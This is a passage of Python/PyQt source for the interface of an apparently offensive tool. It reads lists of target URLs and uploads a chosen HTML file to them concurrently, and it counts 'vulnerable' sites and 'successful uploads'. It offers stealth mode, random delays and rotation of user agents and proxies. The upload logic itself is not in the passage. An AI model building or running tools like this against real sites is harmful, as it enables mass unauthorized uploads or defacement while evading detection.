            self.user_agent_list.addItems(self.user_agents)
    
    def init_ui(self):
        # Create menu bar
        self.create_menu_bar()
        
        # Create toolbar
        self.create_tool_bar()
        
        # Central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        # Create tabs
        self.tabs = QTabWidget()
        self.tab1 = QWidget()  # Single test
        self.tab2 = QWidget()  # File test
        self.tab3 = QWidget()  # Settings
        self.tab4 = QWidget()  # Dashboard/Reporting
        self.tab5 = QWidget()  # History
        
        self.tabs.addTab(self.tab1, "Single Test")
        self.tabs.addTab(self.tab2, "File Test")
        self.tabs.addTab(self.tab3, "Settings")
        self.tabs.addTab(self.tab4, "Dashboard")
        self.tabs.addTab(self.tab5, "History")
        
        # Configure each tab
        self.setup_tab1()
        self.setup_tab2()
        self.setup_tab3()
        self.setup_tab4()
        self.setup_tab5()
        
        # Add tabs to main layout
        main_layout.addWidget(self.tabs)
        
        # Status bar
        self.statusBar().showMessage("Ready")
    
    def create_menu_bar(self):
        """Create menu bar"""
        menu_bar = self.menuBar()
        
        # File menu
        file_menu = menu_bar.addMenu("File")
        
        new_project_action = QAction("New Project", self)
        new_project_action.triggered.connect(self.new_project)
        file_menu.addAction(new_project_action)
        
        open_project_action = QAction("Open Project", self)
        open_project_action.triggered.connect(self.open_project)
        file_menu.addAction(open_project_action)
        
        save_project_action = QAction("Save Project", self)
        save_project_action.triggered.connect(self.save_project)
        file_menu.addAction(save_project_action)
        
        file_menu.addSeparator()
        
        export_csv_action = QAction("Export to CSV", self)
        export_csv_action.triggered.connect(self.export_csv)
        file_menu.addAction(export_csv_action)
        
        file_menu.addSeparator()
        
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
        
        # Edit menu
        edit_menu = menu_bar.addMenu("Edit")
        
        settings_action = QAction("Preferences", self)
        settings_action.triggered.connect(self.show_settings)
        edit_menu.addAction(settings_action)
        
        # View menu
        view_menu = menu_bar.addMenu("View")
        
        theme_menu = view_menu.addMenu("Themes")
        cyberpunk_action = QAction("Cyberpunk", self)
        cyberpunk_action.triggered.connect(lambda: self.change_theme("cyberpunk"))
        theme_menu.addAction(cyberpunk_action)
        
        dark_action = QAction("Dark", self)
        dark_action.triggered.connect(lambda: self.change_theme("dark"))
        theme_menu.addAction(dark_action)
        
        light_action = QAction("Light", self)
        light_action.triggered.connect(lambda: self.change_theme("light"))
        theme_menu.addAction(light_action)
        
        # Help menu
        help_menu = menu_bar.addMenu("Help")
        
        about_action = QAction("About", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)
        
        docs_action = QAction("Documentation", self)
        docs_action.triggered.connect(self.show_documentation)
        help_menu.addAction(docs_action)
    
    def create_tool_bar(self):
        """Create toolbar"""
        tool_bar = QToolBar("Toolbar")
        self.addToolBar(tool_bar)
        
        new_project_btn = QAction("New", self)
        new_project_btn.triggered.connect(self.new_project)
        tool_bar.addAction(new_project_btn)
        
        save_project_btn = QAction("Save", self)
        save_project_btn.triggered.connect(self.save_project)
        tool_bar.addAction(save_project_btn)
        
        tool_bar.addSeparator()
        
        run_test_btn = QAction("Run", self)
        run_test_btn.triggered.connect(self.run_selected_test)
        tool_bar.addAction(run_test_btn)
        
        stop_test_btn = QAction("Stop", self)
        stop_test_btn.triggered.connect(self.stop_current_test)
        tool_bar.addAction(stop_test_btn)
    
    def setup_tab1(self):
        layout = QVBoxLayout(self.tab1)
        
        # Group for single target
        target_group = QGroupBox("Single Target")
        target_layout = QVBoxLayout()
        
        # Target URL
        url_layout = QHBoxLayout()
        url_layout.addWidget(QLabel("URL:"))
        self.single_url = QLineEdit()
        self.single_url.setPlaceholderText("https://example.com")
        url_layout.addWidget(self.single_url)
        target_layout.addLayout(url_layout)
        
        # File to upload
        file_layout = QHBoxLayout()
        file_layout.addWidget(QLabel("File to upload:"))
        self.single_html_file = QLineEdit()
        self.single_html_file.setPlaceholderText("Select HTML/TXT file")
        file_layout.addWidget(self.single_html_file)
        self.single_file_btn = QPushButton("Browse")
        self.single_file_btn.clicked.connect(self.browse_single_file)
        file_layout.addWidget(self.single_file_btn)
        target_layout.addLayout(file_layout)
        
        # Advanced options
        advanced_group = QGroupBox("Advanced Options")
        advanced_layout = QHBoxLayout()
        
        advanced_layout.addWidget(QLabel("Timeout:"))
        self.single_timeout_spin = QSpinBox()
        self.single_timeout_spin.setRange(1, 60)
        self.single_timeout_spin.setValue(10)
        self.single_timeout_spin.setSuffix("s")
        advanced_layout.addWidget(self.single_timeout_spin)
        
        self.single_stealth_check = QCheckBox("Stealth Mode")
        advanced_layout.addWidget(self.single_stealth_check)
        
        self.single_random_delay_check = QCheckBox("Random Delay")
        advanced_layout.addWidget(self.single_random_delay_check)
        
        self.single_verbose_check = QCheckBox("Verbose")
        advanced_layout.addWidget(self.single_verbose_check)
        
        advanced_group.setLayout(advanced_layout)
        target_layout.addWidget(advanced_group)
        
        # Test button
        self.single_test_btn = QPushButton("Start Test")
        self.single_test_btn.clicked.connect(self.run_single_test)
        target_layout.addWidget(self.single_test_btn)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Progress bar
        self.single_progress_bar = QProgressBar()
        layout.addWidget(self.single_progress_bar)
        
        # Results area
        result_group = QGroupBox("Real-time Results")
        result_layout = QVBoxLayout()
        self.single_result = QTextEdit()
        self.single_result.setReadOnly(True)
        result_layout.addWidget(self.single_result)
        result_group.setLayout(result_layout)
        layout.addWidget(result_group)
    
    def setup_tab2(self):
        layout = QVBoxLayout(self.tab2)
        
        # Group for targets file
        file_group = QGroupBox("Targets File")
        file_layout = QVBoxLayout()
        
        # Select targets file
        target_file_layout = QHBoxLayout()
        target_file_layout.addWidget(QLabel("URLs file:"))
        self.target_file = QLineEdit()
        self.target_file.setPlaceholderText("Select text file with URLs")
        target_file_layout.addWidget(self.target_file)
        self.target_file_btn = QPushButton("Browse")
        self.target_file_btn.clicked.connect(self.browse_target_file)
        target_file_layout.addWidget(self.target_file_btn)
        file_layout.addLayout(target_file_layout)
        
        # Select file to upload
        html_file_layout = QHBoxLayout()
        html_file_layout.addWidget(QLabel("File to upload:"))
        self.multi_html_file = QLineEdit()
        self.multi_html_file.setPlaceholderText("Select HTML/TXT file")
        html_file_layout.addWidget(self.multi_html_file)
        self.multi_file_btn = QPushButton("Browse")
        self.multi_file_btn.clicked.connect(self.browse_multi_file)
        html_file_layout.addWidget(self.multi_file_btn)
        file_layout.addLayout(html_file_layout)
        
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)
        
        # Options
        options_group = QGroupBox("Options")
        options_layout = QHBoxLayout()
        
        options_layout.addWidget(QLabel("Workers:"))
        self.workers_spin = QSpinBox()
        self.workers_spin.setRange(1, 50)
        self.workers_spin.setValue(10)
        options_layout.addWidget(self.workers_spin)
        
        options_layout.addWidget(QLabel("Timeout:"))
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 60)
        self.timeout_spin.setValue(10)
        self.timeout_spin.setSuffix("s")
        options_layout.addWidget(self.timeout_spin)
        
        options_layout.addStretch()
        
        self.stealth_check = QCheckBox("Stealth Mode")
        options_layout.addWidget(self.stealth_check)
        
        self.random_delay_check = QCheckBox("Random Delay")
        options_layout.addWidget(self.random_delay_check)
        
        self.verbose_check = QCheckBox("Verbose")
        options_layout.addWidget(self.verbose_check)
        
        options_group.setLayout(options_layout)
        layout.addWidget(options_group)
        
        # Test button
        self.multi_test_btn = QPushButton("Start Multi Test")
        self.multi_test_btn.clicked.connect(self.run_multi_test)
        layout.addWidget(self.multi_test_btn)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        layout.addWidget(self.progress_bar)
        
        # Results area
        result_group = QGroupBox("Real-time Results")
        result_layout = QVBoxLayout()
        self.multi_result = QTextEdit()
        self.multi_result.setReadOnly(True)
        result_layout.addWidget(self.multi_result)
        result_group.setLayout(result_layout)
        layout.addWidget(result_group)
    
    def setup_tab3(self):
        layout = QVBoxLayout(self.tab3)
        
        # User Agents
        ua_group = QGroupBox("User Agents")
        ua_layout = QVBoxLayout()
        
        # User agents list
        self.user_agent_list = QListWidget()
        ua_layout.addWidget(self.user_agent_list)
        
        # Add/remove user agents
        ua_buttons_layout = QHBoxLayout()
        self.add_ua_btn = QPushButton("Add")
        self.add_ua_btn.clicked.connect(self.add_user_agent)
        ua_buttons_layout.addWidget(self.add_ua_btn)
        
        self.remove_ua_btn = QPushButton("Remove")
        self.remove_ua_btn.clicked.connect(self.remove_user_agent)
        ua_buttons_layout.addWidget(self.remove_ua_btn)
        
        self.generate_ua_btn = QPushButton("Generate Random")
        self.generate_ua_btn.clicked.connect(self.generate_random_ua)
        ua_buttons_layout.addWidget(self.generate_ua_btn)
        
        self.rotate_ua_btn = QPushButton("Auto Rotation")
        self.rotate_ua_btn.clicked.connect(self.toggle_ua_rotation)
        ua_buttons_layout.addWidget(self.rotate_ua_btn)
        
        ua_layout.addLayout(ua_buttons_layout)
        ua_group.setLayout(ua_layout)
        layout.addWidget(ua_group)
        
        # Proxies
        proxy_group = QGroupBox("Proxies")
        proxy_layout = QVBoxLayout()
        
        # Proxy type
        proxy_type_layout = QHBoxLayout()
        proxy_type_layout.addWidget(QLabel("Type:"))
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["HTTP", "HTTPS", "SOCKS4", "SOCKS5"])
        proxy_type_layout.addWidget(self.proxy_type_combo)
        proxy_type_layout.addStretch()
        proxy_layout.addLayout(proxy_type_layout)
        
        # Proxies list
        self.proxy_list = QListWidget()
        proxy_layout.addWidget(self.proxy_list)
        
        # Add/remove proxies
        proxy_buttons_layout = QHBoxLayout()
        self.add_proxy_btn = QPushButton("Add")
        self.add_proxy_btn.clicked.connect(self.add_proxy)
        proxy_buttons_layout.addWidget(self.add_proxy_btn)
        
        self.remove_proxy_btn = QPushButton("Remove")
        self.remove_proxy_btn.clicked.connect(self.remove_proxy)
        proxy_buttons_layout.addWidget(self.remove_proxy_btn)
        
        self.test_proxy_btn = QPushButton("Test Proxy")
        self.test_proxy_btn.clicked.connect(self.test_proxy)
        proxy_buttons_layout.addWidget(self.test_proxy_btn)
        
        self.rotate_proxy_btn = QPushButton("Auto Rotation")
        self.rotate_proxy_btn.clicked.connect(self.toggle_proxy_rotation)
        proxy_buttons_layout.addWidget(self.rotate_proxy_btn)
        
        proxy_layout.addLayout(proxy_buttons_layout)
        proxy_group.setLayout(proxy_layout)
        layout.addWidget(proxy_group)
        
        # Validation
        validation_group = QGroupBox("Validation")
        validation_layout = QVBoxLayout()
        
        self.validate_btn = QPushButton("Validate Configuration")
        self.validate_btn.clicked.connect(self.validate_config)
        validation_layout.addWidget(self.validate_btn)
        
        self.validation_result = QTextEdit()
        self.validation_result.setReadOnly(True)
        validation_layout.addWidget(self.validation_result)
        
        validation_group.setLayout(validation_layout)
        layout.addWidget(validation_group)
        
        # Load data
        self.load_config_data()
    
    def setup_tab4(self):
        layout = QVBoxLayout(self.tab4)
        
        # Statistics
        stats_group = QGroupBox("Statistics")
        stats_layout = QHBoxLayout()
        
        stats_layout.addWidget(QLabel("Targets tested:"))
        self.tested_label = QLabel("0")
        stats_layout.addWidget(self.tested_label)
        
        stats_layout.addWidget(QLabel("Vulnerable:"))
        self.vulnerable_label = QLabel("0")
        stats_layout.addWidget(self.vulnerable_label)
        
        stats_layout.addWidget(QLabel("Successful uploads:"))
        self.uploaded_label = QLabel("0")
        stats_layout.addWidget(self.uploaded_label)
        
        stats_layout.addStretch()
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Results table
        results_group = QGroupBox("Detailed Results")
        results_layout = QVBoxLayout()
        
        self.results_table = QTableWidget()
        self.results_table.setColumnCount(6)
        self.results_table.setHorizontalHeaderLabels(["URL", "Status", "Ports", "Technology", "Methods", "Upload"])
        self.results_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        results_layout.addWidget(self.results_table)
        
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        # Export buttons
        export_layout = QHBoxLayout()
        
        self.export_csv_btn = QPushButton("Export CSV")
        self.export_csv_btn.clicked.connect(self.export_csv)
        export_layout.addWidget(self.export_csv_btn)
        
        self.export_json_btn = QPushButton("Export JSON")
        self.export_json_btn.clicked.connect(self.export_json)
        export_layout.addWidget(self.export_json_btn)
        
        layout.addLayout(export_layout)
    
    def setup_tab5(self):
        layout = QVBoxLayout(self.tab5)
        
        # Session history
        history_group = QGroupBox("Session History")
        history_layout = QVBoxLayout()
        
        self.history_list = QListWidget()
        history_layout.addWidget(self.history_list)
        
        history_btn_layout = QHBoxLayout()
        self.load_history_btn = QPushButton("Load Session")
        self.load_history_btn.clicked.connect(self.load_history)
        history_btn_layout.addWidget(self.load_history_btn)
        
        self.delete_history_btn = QPushButton("Delete Session")
        self.delete_history_btn.clicked.connect(self.delete_history)
        history_btn_layout.addWidget(self.delete_history_btn)
        
        self.clear_history_btn = QPushButton("Clear History")
        self.clear_history_btn.clicked.connect(self.clear_history)
        history_btn_layout.addWidget(self.clear_history_btn)
        
        history_layout.addLayout(history_btn_layout)
        history_group.setLayout(history_layout)
        layout.addWidget(history_group)
        
        # Session details
        details_group = QGroupBox("Session Details")
        details_layout = QVBoxLayout()
        
        self.history_details = QTextEdit()
        self.history_details.setReadOnly(True)
        details_layout.addWidget(self.history_details)
        
        details_group.setLayout(details_layout)
        layout.addWidget(details_group)
    
    def load_config_data(self):
        # Load user agents
        if hasattr(self, 'user_agent_list'):
            self.user_agent_list.clear()
            self.user_agent_list.addItems(self.user_agents)
        
        # Load proxies (empty by default)
        if hasattr(self, 'proxy_list'):
            self.proxy_list.clear()
            self.proxy_list.addItems(self.proxies)
    
    def browse_single_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select a file", "", "HTML Files (*.html *.htm);;Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.single_html_file.setText(file_path)
    
    def browse_target_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select URLs file", "", "Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.target_file.setText(file_path)
    
    def browse_multi_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select a file", "", "HTML Files (*.html *.htm);;Text Files (*.txt);;All Files (*)"
        )
        if file_path:
            self.multi_html_file.setText(file_path)
    
    def add_user_agent(self):
        ua, ok = QtWidgets.QInputDialog.getText(
            self, "Add User Agent", "Enter User Agent:"
        )
        if ok and ua:
            self.user_agents.append(ua)
            if hasattr(self, 'user_agent_list'):
                self.user_agent_list.addItem(ua)
    
    def remove_user_agent(self):
        if not hasattr(self, 'user_agent_list'):
            return
            
        current_row = self.user_agent_list.currentRow()
        if current_row >= 0 and current_row < len(self.user_agents):
            self.user_agents.pop(current_row)
            self.user_agent_list.takeItem(current_row)
    
    def generate_random_ua(self):
        """Generate a random User-Agent"""
        browsers = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{version}) Gecko/20100101 Firefox/{version}',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36'
        ]
        
        versions = {
            'Chrome': ['91.0.4472.114', '92.0.4515.107', '93.0.4577.63', '94.0.4606.61'],
            'Firefox': ['89.0', '90.0', '91.0', '92.0'],
            'Safari': ['14.1.1', '14.1.2', '15.0', '15.1']
        }
        
        browser = random.choice(browsers)
        if 'Chrome' in browser:
            version = random.choice(versions['Chrome'])
        elif 'Firefox' in browser:
            version = random.choice(versions['Firefox'])
        else:
            version = random.choice(versions['Safari'])
        
        ua = browser.format(version=version)
        self.user_agents.append(ua)
        if hasattr(self, 'user_agent_list'):
            self.user_agent_list.addItem(ua)
    
    def toggle_ua_rotation(self):
        """Enable/disable automatic User-Agent rotation"""
        if hasattr(self, 'ua_rotation_enabled'):
            self.ua_rotation_enabled = not self.ua_rotation_enabled
        else:
            self.ua_rotation_enabled = True
        
        if self.ua_rotation_enabled:
            self.rotate_ua_btn.setText("Disable Rotation")
            self.statusBar().showMessage("User-Agent rotation enabled")
        else:
            self.rotate_ua_btn.setText("Auto Rotation")
            self.statusBar().showMessage("User-Agent rotation disabled")
    
    def add_proxy(self):
        proxy, ok = QtWidgets.QInputDialog.getText(
            self, "Add Proxy", "Enter proxy (format: host:port):"
        )
        if ok and proxy:
            proxy_type = self.proxy_type_combo.currentText().lower()
            full_proxy = f"{proxy_type}://{proxy}"
            self.proxies.append(full_proxy)
            if hasattr(self, 'proxy_list'):
                self.proxy_list.addItem(full_proxy)
    
    def remove_proxy(self):
        if not hasattr(self, 'proxy_list'):
            return
            
        current_row = self.proxy_list.currentRow()
        if current_row >= 0 and current_row < len(self.proxies):
            self.proxies.pop(current_row)
            self.proxy_list.takeItem(current_row)
    
    def test_proxy(self):
        if not hasattr(self, 'proxy_list'):
            return
            
        current_row = self.proxy_list.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Error", "Please select a proxy to test.")
            return
        
        proxy = self.proxies[current_row]
        self.validation_result.append(f"Testing proxy: {proxy}")
        
        try:
            # Simple connection test via proxy
            response = requests.get('http://httpbin.org/ip', 
                                  proxies={'http': proxy, 'https': proxy},
                                  timeout=10)
            if response.status_code == 200:
                self.validation_result.append(f"Proxy working: {response.json()['origin']}")
            else:
                self.validation_result.append("Proxy tested but non-200 response")
        except Exception as e:
            self.validation_result.append(f"Proxy error: {str(e)}")
    
    def toggle_proxy_rotation(self):
        """Enable/disable automatic proxy rotation"""
        if hasattr(self, 'proxy_rotation_enabled'):
            self.proxy_rotation_enabled = not self.proxy_rotation_enabled
        else:
            self.proxy_rotation_enabled = True
        
        if self.proxy_rotation_enabled:
            self.rotate_proxy_btn.setText("Disable Rotation")
            self.statusBar().showMessage("Proxy rotation enabled")
        else:
            self.rotate_proxy_btn.setText("Auto Rotation")
            self.statusBar().showMessage("Proxy rotation disabled")
    
    def validate_config(self):
        self.validation_result.clear()
        self.validation_result.append("=== Configuration Validation ===")
        self.validation_result.append(f"User Agents: {len(self.user_agents)}")
        self.validation_result.append(f"Proxies: {len(self.proxies)}")
        
        # Proxy verification
        for proxy in self.proxies:
            try:
                response = requests.get('http://httpbin.org/ip', 
                                      proxies={'http': proxy, 'https': proxy},
                                      timeout=5)
                if response.status_code == 200:
                    self.validation_result.append(f"✓ {proxy} - Working")
                else:
                    self.validation_result.append(f"✗ {proxy} - HTTP Error {response.status_code}")
            except Exception as e:
                self.validation_result.append(f"✗ {proxy} - Error: {str(e)}")
        
        self.validation_result.append("Configuration validated successfully!")
    
    def run_single_test(self):
        url = self.single_url.text().strip()
        html_file = self.single_html_file.text().strip()
        
        if not url:
            QMessageBox.warning(self, "Error", "Please enter a URL.")
            return
        
        if not html_file or not os.path.isfile(html_file):
            QMessageBox.warning(self, "Error", "Please select a valid file.")
            return
        
        # Update configuration
        self.config['timeout'] = self.single_timeout_spin.value()
        self.config['verbose'] = self.single_verbose_check.isChecked()
        self.config['stealth_mode'] = self.single_stealth_check.isChecked()
        self.config['random_delay'] = self.single_random_delay_check.isChecked()
        
        # Use first user agent from list
        if self.user_agents:
            self.config['user_agent'] = self.user_agents[0]
        
        # Use proxy if available and rotation enabled
        if hasattr(self, 'proxy_rotation_enabled') and self.proxy_rotation_enabled and self.proxies:
            self.config['proxy'] = random.choice(self.proxies)
        
        self.single_result.clear()
        self.single_result.append(f"Starting test on: {url}")
        self.single_result.append(f"File: {html_file}")
        
        # Start test thread
        self.single_test_thread = TestThread([url], html_file, self.config)
        self.single_test_thread.update_signal.connect(self.update_single_result)
        self.single_test_thread.progress_signal.connect(self.single_progress_bar.setValue)
        self.single_test_thread.finished_signal.connect(self.single_test_finished)
        self.single_test_thread.result_signal.connect(self.process_result)
        self.single_test_thread.start()
        
        # Disable button during test
        self.single_test_btn.setEnabled(False)
    
    def update_single_result(self, message):
        self.single_result.append(message)
    
    def process_result(self, result):
        """Process results and update interface"""
        for target, data in result.items():
            self.results[target] = data
            
            # Update table
            row = self.results_table.rowCount()
            self.results_table.insertRow(row)
            
            self.results_table.setItem(row, 0, QTableWidgetItem(target))
            self.results_table.setItem(row, 1, QTableWidgetItem(data['status']))
            self.results_table.setItem(row, 2, QTableWidgetItem(str(data.get('ports', []))))
            self.results_table.setItem(row, 3, QTableWidgetItem(str(data.get('technology', {}))))
            self.results_table.setItem(row, 4, QTableWidgetItem(', '.join(data.get('methods', []))))
            self.results_table.setItem(row, 5, QTableWidgetItem('YES' if data.get('uploaded', False) else 'NO'))
            
            # Update statistics
            self.update_stats()
    
    def update_stats(self):
        """Update dashboard statistics"""
        total = len(self.results)
        vulnerable = sum(1 for r in self.results.values() if r['status'] == "VULNERABLE")
        uploaded = sum(1 for r in self.results.values() if r.get('uploaded', False))
        
        self.tested_label.setText(str(total))
        self.vulnerable_label.setText(str(vulnerable))
        self.uploaded_label.setText(str(uploaded))
    
    def single_test_finished(self, results):
        self.single_test_btn.setEnabled(True)
        self.single_progress_bar.setValue(100)
        
        # Save to history
        self.save_to_history("Single test", results)
        
        # Display summary
        for target, result in results.items():
            self.single_result.append("=== TEST COMPLETED ===")
            self.single_result.append(f"Target: {target}")
            self.single_result.append(f"Status: {result['status']}")
            
            if result['status'] == 'VULNERABLE':
                self.single_result.append(f"Methods found: {', '.join(result['methods'])}")
                self.single_result.append(f"Upload: {'SUCCESSFUL' if result['uploaded'] else 'FAILED'}")
                if result['uploaded']:
                    self.single_result.append(f"Method used: {result['method_used']}")
    
    def run_multi_test(self):
        target_file = self.target_file.text().strip()
        html_file = self.multi_html_file.text().strip()
        
        if not target_file or not os.path.isfile(target_file):
            QMessageBox.warning(self, "Error", "Please select a valid URLs file.")
            return
        
        if not html_file or not os.path.isfile(html_file):
            QMessageBox.warning(self, "Error", "Please select a valid file.")
            return
        
        # Read URLs from file
        try:
            with open(target_file, 'r') as f:
                targets = [line.strip() for line in f if line.strip() and (
                    line.startswith('http://') or line.startswith('https://')
                )]
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Cannot read file: {e}")
            return
        
        if not targets:
            QMessageBox.warning(self, "Error", "No valid URLs found in file.")
            return
        
        # Update configuration
        self.config['max_workers'] = self.workers_spin.value()
        self.config['timeout'] = self.timeout_spin.value()
        self.config['verbose'] = self.verbose_check.isChecked()
        self.config['stealth_mode'] = self.stealth_check.isChecked()
        self.config['random_delay'] = self.random_delay_check.isChecked()
        
        # Use first user agent from list
        if self.user_agents:
            self.config['user_agent'] = self.user_agents[0]
        
        # Use proxy if available and rotation enabled
        if hasattr(self, 'proxy_rotation_enabled') and self.proxy_rotation_enabled and self.proxies:
            self.config['proxy'] = random.choice(self.proxies)
        
        self.multi_result.clear()
        self.multi_result.append(f"Starting multi test with {len(targets)} targets")
        self.multi_result.append(f"File: {html_file}")
        
        # Reset results
        self.results = {}
        self.results_table.setRowCount(0)
        self.update_stats()
        
        # Start test thread
        self.multi_test_thread = TestThread(targets, html_file, self.config)
        self.multi_test_thread.update_signal.connect(self.update_multi_result)
        self.multi_test_thread.progress_signal.connect(self.progress_bar.setValue)
        self.multi_test_thread.finished_signal.connect(self.multi_test_finished)
        self.multi_test_thread.result_signal.connect(self.process_result)
        self.multi_test_thread.start()
        
        # Disable button during test
        self.multi_test_btn.setEnabled(False)
    
    def update_multi_result(self, message):
        self.multi_result.append(message)
    
    def multi_test_finished(self, results):
        self.multi_test_btn.setEnabled(True)
        self.progress_bar.setValue(100)
        
        # Save to history
        self.save_to_history("Multi test", results)
        
        # Display summary
        vulnerable = sum(1 for r in results.values() if r['status'] == "VULNERABLE")
        uploaded = sum(1 for r in results.values() if r.get('uploaded', False))
        
        self.multi_result.append("=== TEST COMPLETED ===")
        self.multi_result.append(f"Targets tested: {len(results)}")
        self.multi_result.append(f"Vulnerable targets: {vulnerable}")
        self.multi_result.append(f"Successful uploads: {uploaded}")
        self.multi_result.append(f"Success rate: {uploaded/len(results)*100:.1f}%")
    
    def save_to_history(self, test_type, results):
        """Save results to history"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        history_entry = {
            'timestamp': timestamp,
            'type': test_type,
            'results': results,
            'config': self.config.copy()
        }
        
        self.history.append(history_entry)
        
        # Update history list
        if hasattr(self, 'history_list'):
            self.history_list.addItem(f"{timestamp} - {test_type} - {len(results)} targets")
    
    def load_history(self):
        """Load a session from history"""
        current_row = self.history_list.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Error", "Please select a session to load.")
            return
        
        history_entry = self.history[current_row]
        
        # Display details
        self.history_details.clear()
        self.history_details.append(f"Timestamp: {history_entry['timestamp']}")
        self.history_details.append(f"Type: {history_entry['type']}")
        self.history_details.append(f"Number of targets: {len(history_entry['results'])}")
        
        # Load results into table
        self.results = history_entry['results']
        self.results_table.setRowCount(0)
        
        for target, data in self.results.items():
            row = self.results_table.rowCount()
            self.results_table.insertRow(row)
            
            self.results_table.setItem(row, 0, QTableWidgetItem(target))
            self.results_table.setItem(row, 1, QTableWidgetItem(data['status']))
            self.results_table.setItem(row, 2, QTableWidgetItem(str(data.get('ports', []))))
            self.results_table.setItem(row, 3, QTableWidgetItem(str(data.get('technology', {}))))
            self.results_table.setItem(row, 4, QTableWidgetItem(', '.join(data.get('methods', []))))
            self.results_table.setItem(row, 5, QTableWidgetItem('YES' if data.get('uploaded', False) else 'NO'))
        
        # Update statistics
        self.update_stats()
        
        self.statusBar().showMessage(f"Session {history_entry['timestamp']} loaded")
    
    def delete_history(self):
        """Delete a history entry"""
        current_row = self.history_list.currentRow()
        if current_row < 0:
            QMessageBox.warning(self, "Error", "Please select a session to delete.")
            return
        
        self.history.pop(current_row)
        self.history_list.takeItem(current_row)
        self.history_details.clear()
        
        self.statusBar().showMessage("Session deleted from history")
    
    def clear_history(self):
        """Clear all history"""
        reply = QMessageBox.question(self, "Confirmation", 
                                   "Are you sure you want to clear all history?",
                                   QMessageBox.Yes | QMessageBox.No)
        
        if reply == QMessageBox.Yes:
            self.history.clear()
            self.history_list.clear()
            self.history_details.clear()
            self.statusBar().showMessage("History cleared")
    
    def export_csv(self):
        """Export results to CSV"""
        if not self.results:
            QMessageBox.warning(self, "Error", "No results to export.")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export to CSV", "", "CSV Files (*.csv)"
        )
        
        if not file_path:
            return
        
        try:
            with open(file_path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Status', 'Ports', 'Technology', 'Methods', 'Upload'])
                
                for target, data in self.results.items():
                    writer.writerow([
                        target,
                        data['status'],
                        str(data.get('ports', [])),
                        str(data.get('technology', {})),
                        ', '.join(data.get('methods', [])),
                        'YES' if data.get('uploaded', False) else 'NO'
                    ])
            
            self.statusBar().showMessage(f"Results exported to CSV: {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error during CSV export: {e}")
    
    def export_json(self):
        """Export results to JSON"""
        if not self.results:
            QMessageBox.warning(self, "Error", "No results to export.")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Export to JSON", "", "JSON Files (*.json)"
        )
        
        if not file_path:
            return
        
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            self.statusBar().showMessage(f"Results exported to JSON: {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error during JSON export: {e}")
    
    def new_project(self):
        """Create a new project"""
        self.results = {}
        self.results_table.setRowCount(0)
        self.update_stats()
        self.statusBar().showMessage("New project created")
    
    def open_project(self):
        """Open an existing project"""
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Open a project", "", "JSON Files (*.json)"
        )
        
        if not file_path:
            return
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                self.results = json.load(f)
            
            # Update table
            self.results_table.setRowCount(0)
            for target, data in self.results.items():
                row = self.results_table.rowCount()
                self.results_table.insertRow(row)
                
                self.results_table.setItem(row, 0, QTableWidgetItem(target))
                self.results_table.setItem(row, 1, QTableWidgetItem(data['status']))
                self.results_table.setItem(row, 2, QTableWidgetItem(str(data.get('ports', []))))
                self.results_table.setItem(row, 3, QTableWidgetItem(str(data.get('technology', {}))))
                self.results_table.setItem(row, 4, QTableWidgetItem(', '.join(data.get('methods', []))))
                self.results_table.setItem(row, 5, QTableWidgetItem('YES' if data.get('uploaded', False) else 'NO'))
            
            # Update statistics
            self.update_stats()
            
            self.statusBar().showMessage(f"Project opened: {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error opening project: {e}")
    
    def save_project(self):
        """Save current project"""
        if not self.results:
            QMessageBox.warning(self, "Error", "No results to save.")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save project", "", "JSON Files (*.json)"
        )
        
        if not file_path:
            return
        
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            self.statusBar().showMessage(f"Project saved: {file_path}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Error saving: {e}")
    
    def show_settings(self):
        """Show settings window"""
        settings_dialog = QDialog(self)
        settings_dialog.setWindowTitle("Preferences")
        settings_dialog.setModal(True)
        settings_dialog.resize(400, 300)
        
        layout = QFormLayout()
        
        # Theme
        theme_combo = QComboBox()
        theme_combo.addItems(["Cyberpunk", "Dark", "Light"])
